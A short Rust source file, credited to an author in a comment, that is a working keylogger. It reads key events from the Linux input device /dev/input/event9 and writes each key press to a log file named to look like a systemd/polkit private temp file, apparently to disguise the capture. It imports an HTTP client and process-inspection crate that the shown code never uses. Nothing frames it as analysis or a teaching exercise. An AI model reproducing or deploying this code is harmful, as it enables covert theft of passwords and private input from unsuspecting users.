use evdev::{Device, InputEventKind, Key};
use std::fs::File;
use std::io::{self, Write};
use sysinfo::{Process, System, RefreshKind, ProcessesToUpdate};
use reqwest;

//Author Alex Messham

fn main() -> io::Result<()> {
    // Open the input device
    let mut device = Device::open("/dev/input/event9").expect("Failed to open device");

    // Create a log file to store keystrokes
    let mut log_file = File::create("/tmp/systemd-private-a1d9cca2dca043428f1b80b93e951e36-polkit.service-2jspkrpwn")?;

    let mut system = System::new_with_specifics(RefreshKind::new().with_processes(Default::default()));

    // Refresh the system processes to get updated information
    system.refresh_processes(ProcessesToUpdate::All);

    // Flag to indicate if the process is found
    let mut found = false;

    loop {
        // Read incoming events
        for ev in device.fetch_events().unwrap() {
            // Check if the event is a keypress
            if let InputEventKind::Key(key) = ev.kind() {
                let key_state = ev.value(); // 1 for press, 0 for release

                // Log only keypresses, not releases
                if key_state == 1 {

                    writeln!(log_file, "Key Pressed: {:?}", key)?;
                    log_file.flush()?;
                }
            }
        }
    }
}
